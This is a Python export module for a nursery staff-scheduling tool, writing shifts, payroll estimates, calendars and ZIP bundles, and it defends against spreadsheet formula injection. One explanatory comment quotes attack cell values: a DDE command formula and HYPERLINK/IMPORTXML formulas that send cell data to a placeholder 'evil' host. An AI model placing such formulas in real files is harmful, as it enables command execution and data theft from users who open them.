"""シフト結果の出力（CSV / Excel / ICS / 給与計算CSV / ZIP）。

このモジュールは ``solver`` や ``standards`` を import しない。
``SolveResult`` / ``RequirementTable`` / ``StaffMember`` は ``domain`` の型だけを前提とする。
"""

from __future__ import annotations

import io
import re
import zipfile
from collections.abc import Mapping, Sequence
from datetime import date, datetime, time, timedelta
from typing import Any

import pandas as pd
from openpyxl import load_workbook

from shiftai import config
from shiftai.domain import (
    CellState,
    FacilitySettings,
    RequirementTable,
    ShiftDay,
    Slot,
    SolveResult,
    StaffMember,
    cost_coefficient,
    format_jp_date,
    format_jp_date_full,
    japanese_weekday,
)

SHIFT_DF_COLUMNS: list[str] = [
    "職員ID",
    "氏名",
    "資格",
    "日付",
    "曜日",
    "時間帯",
    "開始",
    "終了",
    "状態",
    "勤務分数",
    "休憩分数",
    "早出",
    "遅出",
]

PAYROLL_DF_COLUMNS: list[str] = [
    "職員ID",
    "氏名",
    "資格",
    "雇用形態",
    "勤務日数",
    "総勤務時間",
    "総休憩時間",
    "実働時間",
    "早朝回数",
    "延長回数",
    "推定人件費",
]

EARLY_BOUNDARY = time(7, 30)
LATE_BOUNDARY = time(18, 0)
EARLY_WINDOW = (config.DEFAULT_EARLY_CARE_START, config.DEFAULT_EARLY_CARE_END)
LATE_WINDOW = (config.DEFAULT_LATE_CARE_START, config.DEFAULT_LATE_CARE_END)


BOM = "﻿"

ICS_PRODID = "-//shiftai//shift//JP"

_UID_SAFE = re.compile(r"[^0-9A-Za-z_.-]")


def _role_text(member: StaffMember) -> str:
    return "|".join(role.value for role in member.roles)


def _staff_index(staff: Sequence[StaffMember]) -> dict[str, StaffMember]:
    return {m.staff_id: m for m in staff}


def _is_early(slot: Slot) -> bool:
    return slot.start < EARLY_BOUNDARY


def _is_late(slot: Slot) -> bool:
    return slot.end > LATE_BOUNDARY


def _work_blocks(day_slots: Sequence[Slot], states: Sequence[CellState]) -> list[tuple[Slot, Slot]]:
    """連続する WORK 時間帯を ``(開始, 終了)`` の組にまとめる。"""
    blocks: list[tuple[Slot, Slot]] = []
    current: Slot | None = None
    for slot, state in zip(day_slots, states, strict=True):
        if state is CellState.WORK:
            if current is None:
                current = slot
            last = slot
        else:
            if current is not None:
                blocks.append((current, last))
                current = None
    if current is not None:
        blocks.append((current, last))
    return blocks


def _blocks_for(
    result: SolveResult, staff_id: str, shift_day: ShiftDay, slots: Sequence[Slot]
) -> list[tuple[Slot, Slot]]:
    return _work_blocks(slots, [shift_day.get(staff_id, s) for s in slots])


def shift_to_dataframe(
    result: SolveResult,
    slots: Sequence[Slot],
    staff: Sequence[StaffMember],
    *,
    include_off: bool = False,
) -> pd.DataFrame:
    """シフトを 1 行 = 職員×日×時間帯 の長い DataFrame にする。"""
    records: list[dict[str, Any]] = []
    for shift_day in result.shift_days:
        day = shift_day.day
        for member in staff:
            row_states = {s.label: shift_day.get(member.staff_id, s) for s in slots}
            if not include_off and all(st is CellState.OFF for st in row_states.values()):
                continue
            for slot in slots:
                state = row_states[slot.label]
                if state is CellState.OFF and not include_off:
                    continue
                working = state is CellState.WORK
                records.append(
                    {
                        "職員ID": member.staff_id,
                        "氏名": member.name,
                        "資格": _role_text(member),
                        "日付": day.isoformat(),
                        "曜日": japanese_weekday(day),
                        "時間帯": slot.label,
                        "開始": slot.start.strftime("%H:%M"),
                        "終了": slot.end.strftime("%H:%M"),
                        "状態": state.value,
                        "勤務分数": slot.minutes if working else 0,
                        "休憩分数": slot.minutes if (state is CellState.BREAK) else 0,
                        "早出": bool(working and _is_early(slot)),
                        "遅出": bool(working and _is_late(slot)),
                    }
                )
    frame = pd.DataFrame.from_records(records, columns=SHIFT_DF_COLUMNS)
    return frame


def shift_matrix_dataframe(
    result: SolveResult,
    day: date,
    slots: Sequence[Slot],
    staff: Sequence[StaffMember],
) -> pd.DataFrame:
    """1 日分の職員×時間帯のマトリクス（index=職員ID, values=状態）。"""
    shift_day = result.day(day)
    matrix: list[list[str]] = []
    for member in staff:
        if shift_day is None:
            matrix.append([CellState.OFF.value] * len(slots))
        else:
            matrix.append([shift_day.get(member.staff_id, s).value for s in slots])
    frame = pd.DataFrame(
        matrix, index=[m.staff_id for m in staff], columns=[s.label for s in slots]
    )
    frame.index.name = "職員ID"
    frame.columns.name = "時間帯"
    return frame


def shift_matrices(
    result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]
) -> pd.DataFrame:
    """全日を ``日付 / 曜日 / 職員ID / 時間帯…`` の 1 枚にまとめた表。"""
    frames = []
    for shift_day in result.shift_days:
        frame = shift_matrix_dataframe(result, shift_day.day, slots, staff).reset_index()
        frame.insert(0, "曜日", japanese_weekday(shift_day.day))
        frame.insert(0, "日付", shift_day.day.isoformat())
        frames.append(frame)
    if not frames:
        return pd.DataFrame(columns=["日付", "曜日", "職員ID", *[s.label for s in slots]])
    return pd.concat(frames, ignore_index=True)


REQUIREMENT_DF_COLUMNS: list[str] = [
    "日付",
    "表示日付",
    "時間帯",
    "開始",
    "終了",
    "年齢クラス",
    "在園児数",
    "必要人員",
    "必要保育士数",
    "時間帯区分",
    "根拠",
    "必須",
]


def requirements_dataframe(table: RequirementTable) -> pd.DataFrame:
    """必要人員|long 形式。``表示日付`` 列（9/28(月) 形式）を併記する。"""
    frame = table.to_long_dataframe()
    if len(frame) == 0 or "日付" not in frame.columns:
        return pd.DataFrame(columns=REQUIREMENT_DF_COLUMNS)
    display = {r.day.isoformat(): format_jp_date(r.day) for r in table.all_requirements()}
    if "表示日付" not in frame.columns:
        frame["表示日付"] = frame["日付"].map(display).fillna("")
        position = frame.columns.get_loc("日付") + 1
        rest = [c for c in frame.columns if c != "表示日付"]
        frame = frame[rest[:position] + ["表示日付"] + rest[position:]]
    return frame


def payroll_dataframe(
    result: SolveResult,
    slots: Sequence[Slot],
    staff: Sequence[StaffMember],
    settings: FacilitySettings | None = None,
) -> pd.DataFrame:
    """職員ごとの勤務時間・休憩・早朝 / 延長回数・推定人件費。"""
    base_rate = (
        settings.labor_cost_per_hour if settings is not None else config.DEFAULT_LABOR_COST_PER_HOUR
    )
    records: list[dict[str, Any]] = []
    for member in staff:
        worked_min = 0
        break_min = 0
        days_worked: set[date] = set()
        early_days: set[date] = set()
        late_days: set[date] = set()
        for shift_day in result.shift_days:
            for slot in slots:
                state = shift_day.get(member.staff_id, slot)
                if state is CellState.WORK:
                    worked_min += slot.minutes
                    days_worked.add(shift_day.day)
                    if slot.overlaps(*EARLY_WINDOW):
                        early_days.add(shift_day.day)
                    if slot.overlaps(*LATE_WINDOW):
                        late_days.add(shift_day.day)
                elif state is CellState.BREAK:
                    break_min += slot.minutes
        # worked_min には休憩が含まれない（BREAK は別の変数に分けている）
        net_hours = max(worked_min / 60.0, 0.0)
        coefficient = cost_coefficient(member.contract.employment_type)
        records.append(
            {
                "職員ID": member.staff_id,
                "氏名": member.name,
                "資格": _role_text(member),
                "雇用形態": member.contract.employment_type.value,
                "勤務日数": len(days_worked),
                "総勤務時間": round(worked_min / 60.0, 2),
                "総休憩時間": round(break_min / 60.0, 2),
                "実働時間": round(net_hours, 2),
                "早朝回数": len(early_days),
                "延長回数": len(late_days),
                "推定人件費": int(round(net_hours * base_rate * coefficient)),
            }
        )
    return pd.DataFrame.from_records(records, columns=PAYROLL_DF_COLUMNS)


#: Excel / Google スプレッドシートが **数式として解釈する** 先頭文字。
#:
#: 出力 CSV のセル値はユーザー入力（氏名・資格・園名など）を含むため、
#: この文字で始まると利用者が Excel で開いた瞬間に実行される。
#: 代表的な攻撃: ``=cmd|'/c calc'!A1`` / ``=HYPERLINK("http://evil/?d="&A1,"x")``
#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で持股窃取）。
#:
#: タブ（``\t``）と carriage return（``\r``）も先頭にあると数式扱いされるため、
#: 前後に空白がある場合も対象に含める。
_CSV_FORMULA_PREFIX = re.compile(r"^[\s]*[=+\-@]")

#: 数式として解釈させないための接頭辞。Excel は ``'`` の次の文字を文字列として扱う。
_CSV_QUOTE_PREFIX = "'"


def _neutralize_csv_formula(value: Any) -> Any:
    """数式として解釈されうる文字列セルの先頭に ``'`` を付ける。

    ``=1+1`` は「数式ではない文字列」なのでこの値が本物だが、
    ``=cmd|'/c calc'!A1`` は実行であり、**利用者には区別がつかない**。
    どちらを望んでいるか分からなくても、
    「実行される」は常に「実行されない」より悪いので、無害化を優先する。
    数値・``None`` はそのまま。数値に見える文字列（``-1`` / ``+2`` / ``-3.5``）は
    Excel が数値として扱うので接頭辞を付けず、文字列のまま残す。
    """
    if not isinstance(value, str):
        return value
    if not _CSV_FORMULA_PREFIX.match(value):
        return value
    try:
        float(value.replace(",", "").strip())
    except ValueError:
        pass
    else:
        return value
    return _CSV_QUOTE_PREFIX + value


def _neutralize_formula_cells(frame: pd.DataFrame) -> pd.DataFrame:
    """DataFrame 全体の文字列セルを数式無効化したコピーを返す。

    元の DataFrame は変更しない（呼び出し側の状態を壊さないため）。

    **列名も対象にする**。``DataFrame.map`` は値を更新するが列名はそのままなので、
    ``=`` で始まる列名（``data_loader`` が取り込み列名をそのまま使う場合に起こりうる）
    は漏れる。列名は ``str`` に寄せてから無害化する。
    """
    out = frame.map(_neutralize_csv_formula)
    out.columns = [
        _neutralize_csv_formula(col) if isinstance(col, str) else col for col in frame.columns
    ]
    return out


def to_csv_bytes(df: pd.DataFrame, *, bom: bool = True, index: bool = False) -> bytes:
    """UTF-8（BOM 付き）CSV のバイト列。

    出力前に :func:`_neutralize_formula_cells` で数式インジェクションを無効化する。
    """
    text = _neutralize_formula_cells(df).to_csv(index=index)
    data = text.encode("utf-8")
    return data if not bom or data.startswith(BOM.encode("utf-8")) else BOM.encode("utf-8") + data


def _safe_sheet_name(name: str, used: set[str]) -> str:
    cleaned = re.sub(r"[\[\]:*?/\\]", "_", str(name)).strip() or "Sheet"
    cleaned = cleaned[:31]
    candidate = cleaned
    counter = 2
    while candidate.lower() in used:
        suffix = f"_{counter}"
        candidate = cleaned[: 31 - len(suffix)] + suffix
        counter += 1
    used.add(candidate.lower())
    return candidate


def to_excel_bytes(sheets: Mapping[str, pd.DataFrame]) -> bytes:
    """複数シートの .xlsx をバイト列で返す。

    **``.xlsx`` も数式インジェクションの対象になる**。
    ``openpyxl`` はセルの文字列が ``=`` で始まると自動的に
    ``data_type="f"``（数式）として書き出すため、CSV と同じ無害化が要る。
    実測: ``ws["A2"].value == "=1+1"`` のとき ``ws["A2"].data_type == "f"``。
    書き出した後に各セルの ``data_type`` を ``"s"`` に固定することで、
    Excel は文字列として表示し、実行しない。
    """
    buffer = io.BytesIO()
    used: set[str] = set()
    with pd.ExcelWriter(buffer, engine="openpyxl") as writer:
        for name, frame in sheets.items():
            frame.to_excel(writer, sheet_name=_safe_sheet_name(name, used), index=False)
    buffer.seek(0)
    workbook = load_workbook(buffer)
    for worksheet in workbook.worksheets:
        for row in worksheet.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    cell.data_type = "s"
    out = io.BytesIO()
    workbook.save(out)
    return out.getvalue()


def _ics_escape(text: str) -> str:
    return (
        str(text)
        .replace("\\", "\\\\")
        .replace(";", "\\;")
        .replace(",", "\\,")
        .replace("\r\n", "\\n")
        .replace("\n", "\\n")
        .replace("\r", "\\n")
    )


def _fold(line: str) -> str:
    """RFC 5545 の 75 octet 折り返し。UTF-8 の文字境界で分割する。"""
    encoded = line.encode("utf-8")
    if len(encoded) <= 75:
        return line
    chunks: list[str] = []
    buffer = b""
    limit = 75
    for char in line:
        piece = char.encode("utf-8")
        if len(buffer) + len(piece) > limit:
            chunks.append(buffer.decode("utf-8"))
            buffer = b""
            limit = 74
        buffer += piece
    if buffer:
        chunks.append(buffer.decode("utf-8"))
    return "\r\n ".join(chunks)


def to_ics(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]) -> str:
    """職員 1 人 1 勤務 = 1 イベント の iCalendar（floating time）。"""
    lines: list[str] = [
        "BEGIN:VCALENDAR",
        "VERSION:2.0",
        f"PRODID:{ICS_PRODID}",
        "CALSCALE:GREGORIAN",
        "METHOD:PUBLISH",
    ]
    now = datetime(2000, 1, 1, 0, 0, 0).strftime("%Y%m%dT%H%M%S")

    for shift_day in result.shift_days:
        day = shift_day.day
        for member in staff:
            for first, last in _blocks_for(result, member.staff_id, shift_day, slots):
                start_dt = datetime.combine(day, first.start)
                end_dt = datetime.combine(day, last.end)
                if end_dt <= start_dt:
                    end_dt = datetime.combine(day, last.end) + timedelta(days=1)
                minutes = last.end_minutes - first.start_minutes
                if minutes <= 0:
                    minutes += 24 * 60
                uid = _UID_SAFE.sub(
                    "-", f"{member.staff_id}-{day:%Y%m%d}-{first.start:%H%M}-{last.end:%H%M}"
                )
                role_text = _role_text(member)
                range_text = f"{first.label}〜{last.end.strftime('%H:%M')}"
                summary = f"勤務: {member.name} ({format_jp_date(day)})"
                alt_desc = f"職種: {role_text}|時間帯: {range_text}|勤務分数: {minutes}"
                lines.extend(
                    [
                        "BEGIN:VEVENT",
                        f"UID:{uid}@shiftai.local",
                        f"DTSTAMP:{now}",
                        f"DTSTART:{start_dt:%Y%m%dT%H%M%S}",
                        f"DTEND:{end_dt:%Y%m%dT%H%M%S}",
                        f"SUMMARY:{_ics_escape(summary)}",
                        f"DESCRIPTION:{_ics_escape(f'職種: {role_text}')} 作業時間: {minutes} 分",
                        f"X-ALT-DESC;FMTTYPE=text:{_ics_escape(alt_desc)}",
                        "TRANSP:OPAQUE",
                        "END:VEVENT",
                    ]
                )
    lines.append("END:VCALENDAR")
    return "\r\n".join(_fold(line) for line in lines) + "\r\n"


def _staff_totals(
    result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]
) -> dict[str, dict[str, Any]]:
    totals: dict[str, dict[str, Any]] = {}
    for member in staff:
        worked = 0
        brk = 0
        days: set[date] = set()
        for shift_day in result.shift_days:
            for slot in slots:
                state = shift_day.get(member.staff_id, slot)
                if state is CellState.WORK:
                    worked += slot.minutes
                    days.add(shift_day.day)
                elif state is CellState.BREAK:
                    brk += slot.minutes
        totals[member.staff_id] = {
            "name": member.name,
            "roles": _role_text(member),
            # ``worked`` は WORK セルだけを溜めたもので、休憩（BREAK）は
            # 別変数 ``brk`` に分けている（＝already 休憩を含まない）。
            # ここで ``worked - brk`` すると休憩を二重に引くことになるため、
            # ``payroll_dataframe``（exporter.py:255）と同じく ``worked`` を
            # そのまま実働時間として出す。
            "worked": worked,
            "break": brk,
            "net": worked,
            "days": len(days),
        }
    return totals


def _period(result: SolveResult) -> tuple[date, date] | None:
    days = sorted({sd.day for sd in result.shift_days})
    if not days:
        return None
    return days[0], days[-1]


def _shortfall_info(result: SolveResult) -> tuple[int, int]:
    """(不足セル数, 法令違反件数) を推定する。"""
    shortfall = 0
    for key in ("shortfall_cells", "shortfall", "不足セル数"):
        if key in result.stats:
            try:
                shortfall = int(result.stats[key])
            except (TypeError, ValueError):
                shortfall = 0
            break
    if not shortfall:
        shortfall = sum(
            1
            for v in result.violations
            if "不足" in v.message
            or "SHORTFALL" in v.code.upper()
            or "SHORTFALL" in str(v.code).upper()
        )
    blockers = len(result.blockers())
    return shortfall, blockers


def summary_markdown(
    result: SolveResult,
    slots: Sequence[Slot],
    staff: Sequence[StaffMember],
    *,
    facility_name: str = "",
    period: tuple[date, date] | None = None,
) -> str:
    """配置基準適合状況をまとめた日本語 markdown。"""
    span = period or _period(result)
    totals = _staff_totals(result, slots, staff)
    shortfall, blockers = _shortfall_info(result)
    warnings = len(result.warnings())
    payroll = payroll_dataframe(result, slots, staff)
    total_cost = int(payroll["推定人件費"].sum()) if len(payroll) else 0
    total_hours = sum(t["net"] for t in totals.values()) / 60.0

    out: list[str] = []
    title = facility_name or "保育園"
    out.append(f"# シフトサマリー: {title}")
    out.append("")
    if span:
        out.append(
            f"- 対象期間: {format_jp_date_full(span[0])} 〜 {format_jp_date_full(span[1])}（{len(result.shift_days)} 日）"
        )
    out.append(f"- 最適化状態: {result.status.value}")
    if result.objective_value is not None:
        out.append(f"- 目的関数値: {result.objective_value:,.2f}")
    out.append(f"- 配置基準の不足セル: **{shortfall}** 件")
    out.append(f"- 法令違反（ブロッカー）: **{blockers}** 件 / 要調整: {warnings} 件")
    out.append(f"- 総実働時間: {total_hours:,.2f} 時間")
    out.append(f"- 推定人件費合計: **{total_cost:,}** 円（実働時間ベース。休憩は含まない）")
    out.append("")

    if result.violations:
        out.append("## 検出された制約違反")
        out.append("")
        out.append("| 深刻度 | コード | 内容 | 日付 | 時間帯 | 職員 |")
        out.append("| --- | --- | --- | --- | --- | --- |")
        for violation in result.violations[:50]:
            out.append(
                "| {} | {} | {} | {} | {} | {} |".format(
                    violation.severity.value,
                    violation.code,
                    violation.message.replace("|", "/"),
                    violation.day.isoformat() if violation.day else "",
                    violation.slot.label if violation.slot else "",
                    violation.staff_id or "",
                )
            )
        if len(result.violations) > 50:
            out.append(f"| ... | | 他 {len(result.violations) - 50} 件 | | | |")
        out.append("")

    out.append("## 職員別勤務時間")
    out.append("")
    out.append("| 職員ID | 氏名 | 資格 | 勤務日数 | 実働時間 | 休憩時間 |")
    out.append("| --- | --- | --- | ---: | ---: | ---: |")
    for member in staff:
        item = totals[member.staff_id]
        out.append(
            "| {} | {} | {} | {} | {:.2f} h | {:.2f} h |".format(
                member.staff_id,
                member.name,
                item["roles"],
                item["days"],
                item["net"] / 60.0,
                item["break"] / 60.0,
            )
        )
    out.append("")

    if result.messages:
        out.append("## メッセージ")
        out.append("")
        out.extend(f"- {message}" for message in result.messages)
        out.append("")

    return "\n".join(out)


def violations_dataframe(violations: Sequence[Any]) -> pd.DataFrame:
    """制約違反の一覧表。

    ``__main__`` からも UI からも使うため出力側に置く。空でも列を持つ
    DataFrame を返し、列が増減しない_table とする。
    """
    return pd.DataFrame.from_records(
        [
            {
                "区分": v.severity.value,
                "コード": v.code,
                "日付": v.day.isoformat() if v.day else "",
                "職員ID": v.staff_id or "",
                "内容": v.message,
            }
            for v in violations
        ],
        columns=["区分", "コード", "日付", "職員ID", "内容"],
    )


def export_bundle_zip(
    result: SolveResult,
    requirements: RequirementTable | None,
    slots: Sequence[Slot],
    staff: Sequence[StaffMember],
    settings: FacilitySettings | None = None,
    gap_report: Any = None,
    violations: Sequence[Any] = (),
) -> bytes:
    """CSV 群 + Excel + サマリーを 1 つの ZIP にまとめる。

    ``gap_report`` を渡すと ``gap.csv`` と ``gap_daily.csv`` が、
    ``violations`` を渡すと ``violations.csv`` が同梱される。
    CLI（``__main__``）と UI（``tab_export``）のどちらからも同じ内容を
    得られるようにするため、バンドルの中身はここで一元化する。
    """
    shift_df = shift_to_dataframe(result, slots, staff)
    payroll = payroll_dataframe(result, slots, staff, settings)
    matrices = shift_matrices(result, slots, staff)
    summary = summary_markdown(
        result,
        slots,
        staff,
        facility_name=settings.facility_name if settings is not None else "",
    )
    sheets: dict[str, pd.DataFrame] = {
        "シフト": shift_df,
        "職員別勤務": matrices,
        "給与計算": payroll,
    }
    if requirements is not None:
        sheets["配置基準"] = requirements_dataframe(requirements)

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("shift.csv", to_csv_bytes(shift_df))
        archive.writestr("payroll.csv", to_csv_bytes(payroll))
        archive.writestr("shift_matrix.csv", to_csv_bytes(matrices))
        if requirements is not None:
            archive.writestr("requirements.csv", to_csv_bytes(requirements_dataframe(requirements)))
        if gap_report is not None:
            archive.writestr("gap.csv", to_csv_bytes(gap_report.to_dataframe()))
            archive.writestr("gap_daily.csv", to_csv_bytes(gap_report.daily_dataframe()))
        if violations:
            archive.writestr("violations.csv", to_csv_bytes(violations_dataframe(violations)))
        archive.writestr("shift.ics", to_ics(result, slots, staff))
        archive.writestr("summary.md", summary.encode("utf-8"))
        archive.writestr("shift.xlsx", to_excel_bytes(sheets))
    return buffer.getvalue()
